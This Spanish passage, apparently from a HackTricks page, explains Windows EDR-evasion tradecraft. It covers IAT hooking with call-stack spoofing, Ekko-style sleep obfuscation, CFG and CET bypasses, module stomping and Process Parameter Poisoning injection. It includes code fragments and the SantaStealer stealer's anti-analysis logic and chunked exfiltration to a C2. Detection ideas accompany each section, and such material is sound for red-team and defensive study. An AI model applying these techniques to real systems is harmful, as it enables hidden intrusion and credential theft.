- Por compatibilidad, exporta una interfaz para que un Aggressor script (o equivalente) pueda registrar qué APIs deben interceptarse para Beacon, BOFs y post-ex DLLs.

Por qué usar IAT hooking aquí
- Funciona con cualquier código que utilice la importación interceptada, sin modificar el código de la herramienta ni depender de Beacon para hacer proxy de APIs específicas.
- Cubre las post-ex DLLs: interceptar LoadLibrary* permite interceptar las cargas de módulos (por ejemplo, System.Management.Automation.dll y clr.dll) y aplicar el mismo enmascaramiento y evasión del stack a sus llamadas de API.
- Restaura el uso fiable de comandos post-ex que crean procesos frente a detecciones basadas en call stacks, mediante el wrapping de CreateProcessA/W.

Esquema mínimo de IAT hook (pseudocódigo x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplica el patch después de las relocations/ASLR y antes del primer uso del import. Los reflective loaders como TitanLdr/AceLdr demuestran el hooking durante el DllMain del módulo cargado.
- Mantén los wrappers pequeños y PIC-safe; resuelve la API real mediante el valor original de la IAT capturado antes del patching o mediante LdrGetProcedureAddress.
- Usa transiciones RW → RX para el PIC y evita dejar páginas con permisos writable+executable.

Stub de spoofing de call stack
- Los stubs PIC de estilo Draugr construyen una cadena de llamadas falsa (return addresses dentro de módulos benignos) y después hacen pivot hacia la API real.
- Esto evade las detecciones que esperan stacks canónicos desde Beacon/BOFs hacia APIs sensibles.
- Combínalo con técnicas de stack cutting/stack stitching para aterrizar dentro de los frames esperados antes del prólogo de la API.

Integración operativa
- Antecede las post-ex DLLs con el reflective loader para que el PIC y los hooks se inicialicen automáticamente cuando se cargue la DLL.
- Usa un Aggressor script para registrar las APIs objetivo, de modo que Beacon y los BOFs se beneficien transparentemente de la misma ruta de evasión sin cambios en el código.

Consideraciones de detección/DFIR
- Integridad de la IAT: entradas que resuelven a direcciones non-image (heap/anon); verificación periódica de los punteros de import.
- Anomalías del stack: return addresses que no pertenecen a imágenes cargadas; transiciones abruptas hacia PIC non-image; ancestry inconsistente de RtlUserThreadStart.
- Telemetría del loader: writes en la IAT dentro del proceso, actividad temprana de DllMain que modifica los import thunks, regiones RX inesperadas creadas durante la carga.
- Evasión de image-load: si haces hooking de LoadLibrary*, monitoriza cargas sospechosas de assemblies de automation/clr correlacionadas con eventos de memory masking.

Building blocks y ejemplos relacionados
- Reflective loaders que realizan IAT patching durante la carga (por ejemplo, TitanLdr, AceLdr)
- Memory masking hooks (por ejemplo, simplehook) y PIC de stack-cutting (stackcutting)
- Stubs PIC de call-stack spoofing (por ejemplo, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks mediante un PICO residente

Si controlas un reflective loader, puedes hacer hooking de los imports **durante** `ProcessImports()` reemplazando el puntero del loader a `GetProcAddress` por un resolver personalizado que compruebe primero los hooks:

- Construye un **PICO residente** (objeto PIC persistente) que sobreviva después de que el loader PIC transitorio se libere.
- Exporta una función `setup_hooks()` que sobrescriba el resolver de imports del loader (por ejemplo, `funcs.GetProcAddress = _GetProcAddress`).
- En `_GetProcAddress`, omite los imports ordinales y usa una búsqueda de hooks basada en hashes como `__resolve_hook(ror13hash(name))`. Si existe un hook, devuélvelo; de lo contrario, delega en el `GetProcAddress` real.
- Registra los objetivos de hooking en link time con las entradas `addhook "MODULE$Func" "hook"` de Crystal Palace. El hook sigue siendo válido porque vive dentro del PICO residente.

Esto produce **IAT redirection en import-time** sin parchear la sección de código de la DLL cargada después de la carga.

### Forzar imports hookeables cuando el objetivo usa PEB-walking

Los hooks de import-time solo se activan si la función está realmente en la IAT del objetivo. Si un módulo resuelve APIs mediante un PEB-walk + hash (sin entrada de import), fuerza un import real para que la ruta `ProcessImports()` del loader pueda verlo:

- Sustituye la resolución de exports basada en hashes (por ejemplo, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por una referencia directa como `&WaitForSingleObject`.
- El compilador emite una entrada en la IAT, lo que permite la interception cuando el reflective loader resuelve los imports.

### Sleep/idle obfuscation de estilo Ekko sin parchear `Sleep()`

En lugar de parchear `Sleep`, haz hooking de las primitivas reales de wait/IPC que usa el implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para waits largos, envuelve la llamada en una cadena de obfuscation de estilo Ekko que cifra la imagen en memoria durante el idle:

- Usa `CreateTimerQueueTimer` para programar una secuencia de callbacks que llamen a `NtContinue` con frames `CONTEXT` creados manualmente.
- Cadena típica (x64): establece la imagen en `PAGE_READWRITE` → cifra mediante RC4 usando `advapi32!SystemFunction032` sobre la imagen mapeada completa → ejecuta el blocking wait → descifra mediante RC4 → **restaura los permisos por sección** recorriendo las secciones PE → señaliza la finalización.
- `RtlCaptureContext` proporciona una plantilla `CONTEXT`; clónala en múltiples frames y establece los registros (`Rip/Rcx/Rdx/R8/R9`) para invocar cada paso.

Detalle operativo: devuelve “success” para waits largos (por ejemplo, `WAIT_OBJECT_0`) para que el caller continúe mientras la imagen está masked. Este patrón oculta el módulo frente a los scanners durante las ventanas de idle y evita la firma clásica de un `Sleep()` parcheado.

Ideas de detección (basadas en telemetría)
- Ráfagas de callbacks de `CreateTimerQueueTimer` que apuntan a `NtContinue`.
- Uso de `advapi32!SystemFunction032` sobre buffers contiguos grandes del tamaño de una imagen.
- `VirtualProtect` sobre rangos grandes seguido de la restauración personalizada de permisos por sección.

### Registro de CFG en runtime para gadgets de sleep-obfuscation

En objetivos con CFG habilitado, el primer salto indirecto hacia un gadget mid-function como `jmp [rbx]` o `jmp rdi` normalmente hará que el proceso se bloquee con `STATUS_STACK_BUFFER_OVERRUN`, porque el gadget no está presente en los metadatos CFG del módulo. Para mantener activas las cadenas de estilo Ekko/Kraken dentro de procesos hardened:

- Registra cada destino indirecto usado por la cadena mediante `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` y entradas `CFG_CALL_TARGET_VALID`.
- Para direcciones dentro de imágenes cargadas (`ntdll`, `kernel32`, `advapi32`), el `MEMORY_RANGE_ENTRY` debe comenzar en la **base de la imagen** y cubrir el **tamaño completo de la imagen**.
- Para regiones manualmente mapeadas/PIC/stomped, usa la **base de la allocation** y el tamaño de la allocation.
- Marca no solo el gadget de dispatch, sino también los exports alcanzados indirectamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls de wait/event) y cualquier sección executable controlada por el atacante que vaya a convertirse en un destino indirecto.

Esto convierte las cadenas de sleep de estilo ROP/JOP, que antes “solo funcionaban en procesos sin CFG”, en una primitive reutilizable para `explorer.exe`, browsers, `svchost.exe` y otros endpoints compilados con `/guard:cf`.

### Stack spoofing safe para CET en threads en sleep

La sustitución completa de `CONTEXT` es ruidosa y puede fallar en sistemas con CET Shadow Stack, porque un `Rip` spoofed aún debe coincidir con el shadow stack de hardware. Un patrón de sleep-masking más seguro es:

- Elige otro thread del mismo proceso y lee los límites del stack de su `NT_TIB`/TEB (`StackBase`, `StackLimit`) mediante `NtQueryInformationThread`.
- Haz backup del TEB/TIB real del thread actual.
- Captura el contexto real del thread en sleep con `GetThreadContext`.
- Copia **solo** el `Rip` real al contexto spoofed, dejando intactos el `Rsp`/estado del stack spoofed.
- Durante la ventana de sleep, copia el `NT_TIB` del thread spoofed al TEB actual para que los stack walkers hagan unwind dentro de un rango de stack legítimo.
- Cuando termine el wait, restaura el TIB y el contexto originales del thread.

Esto conserva un instruction pointer consistente con CET, mientras engaña a los stack walkers del EDR que confían en los metadatos del stack del TEB para validar los unwinds.

### Alternativa basada en APC: Kraken Mask

Si el dispatch mediante timer-queue tiene demasiadas signatures, la misma secuencia de sleep-encrypt-spoof-restore puede ejecutarse desde un helper thread suspendido usando APCs encoladas:

- Crea un helper thread con `NtTestAlert` como entrypoint.
- Encola frames `CONTEXT`/APCs preparados con `NtQueueApcThread` y ejecútalos con `NtAlertResumeThread`.
- Almacena el estado de la cadena en el heap en lugar del stack del helper para evitar agotar el stack predeterminado de 64 KB del thread.
- Usa `NtSignalAndWaitForSingleObject` para señalizar atómicamente el start event y bloquear.
- Suspende el thread principal antes de restaurar el TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) para reducir la race window en la que un scanner podría capturar un stack parcialmente restaurado.

Esto sustituye la signature `CreateTimerQueueTimer` + `NtContinue` por una signature de helper-thread/APC, manteniendo los mismos objetivos de RC4 masking y stack-spoofing.

Ideas de detección adicionales
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco antes de sleeps, waits o dispatch de APC.
- `GetThreadContext`/`SetThreadContext` alrededor de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de writes directos en los límites del stack del TEB/TIB del thread actual.
- Cadenas `NtQueueApcThread`/`NtAlertResumeThread` que alcancen indirectamente `SystemFunction032`, `VirtualProtect` o helpers de restauración de permisos de sección.
- Uso repetido de signatures cortas de gadgets como `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) como pivots de dispatch dentro de módulos firmados.


## Precision Module Stomping

Module stomping ejecuta payloads desde la **sección `.text` de una DLL ya mapeada dentro del proceso objetivo** en lugar de asignar memoria executable privada obvia o cargar una DLL sacrificial nueva. El objetivo del overwrite debe ser una **imagen cargada y respaldada por disco** cuyo espacio de código pueda absorber el payload sin corromper las rutas de código que el proceso aún necesita.

### Selección fiable del objetivo

El stomping ingenuo contra módulos comunes como `uxtheme.dll` o `comctl32.dll` es frágil: la DLL puede no estar cargada en el proceso remoto, y una región de código demasiado pequeña hará que el proceso se bloquee. Un workflow más fiable es:

1. Enumera los módulos del proceso objetivo y conserva una **include list compuesta solo por nombres** de las DLLs ya cargadas.
2. Construye primero el payload y registra su **tamaño exacto en bytes**.
3. Escanea las DLLs candidatas en disco y compara `Misc_VirtualSize` de la sección PE **`.text`** con el tamaño del payload. Esto importa más que el tamaño del archivo porque refleja el tamaño de la sección executable **cuando se mapea en memoria**.
4. Analiza la **Export Address Table (EAT)** y elige el RVA de una función exportada como offset inicial del stomp.
5. Calcula el **blast radius**: si el payload supera el límite de la función seleccionada, sobrescribirá los exports adyacentes dispuestos después de ella en memoria.

Helpers de recon/selección habituales observados in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notas operativas
- Preferir DLLs **ya cargadas** en el proceso remoto para evitar la telemetría de `LoadLibrary`/cargas de imágenes inesperadas.
- Preferir exports que la aplicación objetivo ejecute rara vez; de lo contrario, las rutas de código normales podrían alcanzar los bytes modificados antes o después de la creación del thread.
- Los implants grandes a menudo requieren cambiar la inserción del shellcode de un literal de string a un **byte-array/braced initializer** para que el buffer completo se represente correctamente en el código fuente del injector.

Ideas de detección
- Escrituras remotas en **páginas ejecutables respaldadas por imágenes** (`MEM_IMAGE`, `PAGE_EXECUTE*`) en lugar de las asignaciones privadas RWX/RX más comunes.
- Puntos de entrada de exports cuyos bytes en memoria ya no coinciden con el archivo de respaldo en disco.
- Threads remotos o pivotes de contexto que comienzan la ejecución dentro de un export legítimo de una DLL cuyos primeros bytes fueron modificados recientemente.
- Secuencias sospechosas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de una DLL, seguidas de la creación de un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) es una técnica de **process-injection / EDR-evasion** que evita la ruta clásica de escritura remota (`VirtualAllocEx` + `WriteProcessMemory`). En lugar de copiar bytes a un target que ya se está ejecutando, abusa del hecho de que Windows **copia determinados parámetros de inicio de `CreateProcessW` al proceso hijo** y los almacena dentro de `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).

### Carriers que `CreateProcessW` puede copiar

Los carriers útiles son:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Restricciones prácticas de los carriers:

- `lpCommandLine` debe apuntar a **memoria escribible** para `CreateProcessW`, y está limitado a **32,767 caracteres Unicode**, incluido el terminador null.
- `lpEnvironment` debe ser un bloque de entorno Unicode formado por strings sucesivos `NAME=VALUE\0`, terminados por un `\0` adicional.
- `lpReserved` está oficialmente reservado, por lo que el mapping de `ShellInfo` debe tratarse como un detalle de implementación y no como un contrato documentado estable.

Esto convierte la creación normal de procesos en el **payload-transfer primitive**. El operador crea el proceso hijo con datos de inicio controlados por el atacante y permite que Windows realice la copia entre procesos.

### Flujo de búsqueda remota sin APIs de escritura remota

Después de crear el proceso hijo, resolver el buffer copiado usando primitives de solo lectura:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtener `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leer el `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Leer `RTL_USER_PROCESS_PARAMETERS`
5. Usar el puntero seleccionado:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flujo mínimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Ejecutando el búfer de parámetros copiado

La región de parámetros copiada normalmente tiene permisos `RW`, no es ejecutable. Una cadena P3 común es:

1. Crear el proceso normalmente (no suspendido)
2. Hacer ejecutable la página de parámetros elegida con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar el handle del hilo principal ya devuelto en `PROCESS_INFORMATION`
4. Redirigir la ejecución con `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescribir `RIP`)

A diferencia de los workflows clásicos de thread hijacking, esto **no requiere** `SuspendThread` / `ResumeThread`; el contexto puede cambiarse directamente en el handle del hilo principal devuelto.

Esto evita varias APIs monitorizadas habitualmente para la inyección:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- a menudo también `SuspendThread` / `ResumeThread`

### Limitación de bytes nulos y shellcode por etapas

Los tres carriers son datos de tipo **string o similares a string**, por lo que un payload sin procesar que contenga `0x00` se trunca durante la transferencia. Una solución práctica es una **primera etapa sin bytes nulos** que reconstruya las constantes en tiempo de ejecución y después cargue una segunda etapa arbitraria.

Un patrón sencillo es la síntesis de constantes basada en XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Esto permite que la primera etapa construya strings de stack, argumentos de API, rutas de DLL o un loader de shellcode de segunda etapa sin incluir null bytes en el parámetro transportado.

### Llamadas a API basadas en el stack desde la primera etapa

Cuando la primera etapa debe llamar a APIs como `LoadLibraryA`, puede:

- hacer push del string/buffer en el stack del objetivo
- reservar el **shadow space de 32 bytes de x64**
- establecer `RCX`, `RDX`, `R8`, `R9` con constantes o punteros relativos a `RSP`
- mantener `RSP` **alineado a 16 bytes** antes de la llamada

A continuación, una segunda etapa puede copiarse desde el stack a una asignación `PAGE_READWRITE`, cambiarse a `PAGE_EXECUTE_READ` con `VirtualProtect` y ejecutarse mediante un salto, evitando una asignación RWX directa.

### Ideas de detección

Buenas oportunidades de hunting mencionadas por los autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` haciendo **ejecutables las páginas de parámetros del proceso**
- ese cambio de protección seguido de `SetThreadContext` / `NtSetContextThread`
- lecturas remotas de `PEB` y, posteriormente, de `RTL_USER_PROCESS_PARAMETERS`
- valores de `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` inusualmente largos o con alta entropía durante la creación del proceso

### Notas

- P3 es un **truco de transferencia entre procesos**, no una primitive de ejecución completa por sí mismo: el parámetro copiado aún necesita un cambio de permisos de ejecución y un método de redirección de la ejecución.
- `RtlCreateProcessReflection` / Dirty Vanity fue considerado por los autores, pero rechazado porque internamente llega a primitives sospechosas como `NtWriteVirtualMemory` y `NtCreateThreadEx`.

## Tradecraft de SantaStealer para la evasión fileless y el robo de credenciales

SantaStealer (también conocido como BluelineStealer) muestra cómo los info-stealers modernos combinan AV bypass, anti-analysis y acceso a credenciales en un único workflow.

### Control del layout del teclado y retraso en sandbox

- Un flag de configuración (`anti_cis`) enumera los layouts de teclado instalados mediante `GetKeyboardLayoutList`. Si encuentra un layout cirílico, el sample crea un marcador `CIS` vacío y termina antes de ejecutar los stealers, garantizando que nunca detone en locales excluidos mientras deja un artefacto para hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica `check_antivm` por capas

- La Variant A recorre la lista de procesos, aplica a cada nombre un rolling checksum personalizado y lo compara con blocklists integradas de debuggers/sandboxes; repite el checksum con el nombre del equipo y comprueba directorios de trabajo como `C:\analysis`.
- La Variant B inspecciona propiedades del sistema (límite inferior del número de procesos, uptime reciente), llama a `OpenServiceA("VBoxGuest")` para detectar las adiciones de VirtualBox y realiza comprobaciones de temporización alrededor de las pausas para detectar la ejecución paso a paso. Cualquier coincidencia aborta la ejecución antes de que se inicien los módulos.

### Helper fileless + carga reflectiva doble con ChaCha20

- La DLL/EXE principal incorpora un helper de credenciales de Chromium que se descarga al disco o se mapea manualmente en memoria; el modo fileless resuelve por sí mismo las importaciones y relocations, por lo que no se escriben artefactos del helper.
- Ese helper almacena una DLL de segunda fase cifrada dos veces con ChaCha20 (dos claves de 32 bytes + nonces de 12 bytes). Después de ambas pasadas, carga reflectivamente el blob (sin `LoadLibrary`) y llama a las exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Las rutinas de ChromElevator utilizan direct-syscall reflective process hollowing para inyectarse en un navegador Chromium activo, heredar las claves de AppBound Encryption y descifrar contraseñas/cookies/tarjetas de crédito directamente desde bases de datos SQLite, a pesar del hardening de ABE.


### Recolección modular en memoria y exfil por HTTP en chunks

- `create_memory_based_log` itera sobre una tabla global de punteros a funciones `memory_generators` y crea un thread por cada módulo habilitado (Telegram, Discord, Steam, capturas de pantalla, documentos, extensiones del navegador, etc.). Cada thread escribe los resultados en buffers compartidos e informa de su cantidad de archivos después de una ventana de join de aproximadamente 45 s.
- Una vez finalizado, todo se comprime con la biblioteca enlazada estáticamente `miniz` como `%TEMP%\\Log.zip`. A continuación, `ThreadPayload1` espera 15 s y transmite el archivo en chunks de 10 MB mediante HTTP POST a `http://<C2>:6767/upload`, haciendo spoofing de un boundary de navegador `multipart/form-data` (`----WebKitFormBoundary***`). Cada chunk añade `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional, y el último chunk agrega `complete: true` para que el C2 sepa que la reensamblación ha terminado.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
